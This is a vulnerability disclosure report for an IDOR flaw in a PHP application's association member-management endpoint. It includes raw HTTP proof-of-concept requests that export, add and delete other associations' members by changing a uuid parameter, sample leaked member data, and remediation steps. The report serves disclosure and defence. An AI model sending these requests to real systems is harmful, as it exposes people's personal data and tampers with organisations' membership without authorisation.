# Description

IDOR and Broken Access Control vulnerability in the association member management workflow (CWE-639 / CWE-862). The member-management endpoint lets association administrators export a CSV list of members, import a CSV to add members, and delete members, all through:

```
/index.php?page=association/association_members.php&uuid=<association-uuid>
```

Because the server does not verify that the `uuid` supplied in the request actually belongs to the caller's association, any logged-in user can:

- Export (read) the complete membership list of any association.
- Import (add) arbitrary users into any association.
- Delete members from any association.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Log in to your own association dashboard. | You have a valid session. |
| 2 - Export | POST to `/index.php?page=association/association_members.php&uuid=4dafc073-...` | Server returns CSV with UserID, Username, E-mail for another association. |
| 3 - Import | Re-POST the same CSV but change the target UUID. | All stolen members are added to another association. |
| 4 - Delete | Send `user_id=1&delete_member=` with the target UUID. | Member is silently removed. |

No special privileges, CSRF token bypass, or rate-limit bypass is required.

# PoC

**1. Export members of another association:**

```http
POST /index.php?page=association/association_members.php&uuid=4dafc073-44d8-4163-9fda-b78119813ced HTTP/2
Host: <IP>
Cookie: PHPSESSID=<valid>
Content-Type: application/x-www-form-urlencoded

export_members=
```

Server response:

```
UserID,Username,Email
1,John,John@tbox.traced
3,neptune1212,neptune1212@tbox.traced
...
```

**2. Import those members into another association:**

```http
POST /index.php?page=association/association_members.php&uuid=f9555159-1427-47c9-82c9-3991c3d02914 HTTP/2
Host: <IP>
Cookie: PHPSESSID=<valid>
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="members_csv"; filename="green_future.csv"
Content-Type: text/csv

UserID,Username,Email
1,John,John@tbox.traced
------BOUNDARY--
```

**3. Delete a member from another association:**

```http
POST /index.php?page=association/association_members.php&uuid=4dafc073-... HTTP/2
Host: <IP>
Cookie: PHPSESSID=<valid>
Content-Type: application/x-www-form-urlencoded

user_id=1&delete_member=
```

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Full disclosure of every association's member PII (usernames & e-mails). |
| Integrity | Attackers can tamper with membership rolls (add fake voters, remove real ones). |
| Availability | Mass deletion could lock legitimate users out of their organisation. |

Overall severity: **High** (CVSS 8.1)

# Remediation

1. **Server-side ownership check** - derive the association UUID from the session or verify that the user is an admin of that UUID before any action.
2. **Reject cross-association requests** - return HTTP 403 if the UUID does not match the current user's association.
3. **Limit import/export rights** to association admins only.
4. **Use hard-to-guess IDs** plus secondary secrets (e.g., UUID + HMAC) if the ID must stay in the URL.

# Author
rstride
